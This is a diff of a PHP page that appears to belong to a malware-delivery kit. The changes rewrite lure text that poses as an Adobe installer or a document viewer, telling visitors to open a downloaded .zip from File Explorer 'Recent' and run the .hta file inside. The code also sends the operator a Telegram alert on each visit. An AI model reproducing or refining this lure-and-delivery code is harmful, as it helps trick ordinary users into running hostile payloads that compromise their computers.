@@ -18,11 +18,13 @@ $tk    = rawurlencode($_GET['tk']);
 $nameQ = rawurlencode($name);
 
 // Instruction is variant-aware: "to install" for Adobe names,
-// "to view your document" for document names. Points at Windows 11
-// File Explorer "Recent", where fresh downloads land first.
+// "to view your document" for document names. The served file is a .zip
+// (the .hta lives inside); points at Windows 11 File Explorer "Recent",
+// where fresh downloads land first.
+$zipBase = preg_replace('/\.hta$/i', '', $name);
 $instr = ($kind === 'adobe')
-    ? 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
-    : 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.';
+    ? 'Find <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to install.'
+    : 'Find <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view your document.';
 
 // ---- one Telegram alert per visit (deduped by token nonce) ----
 $key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
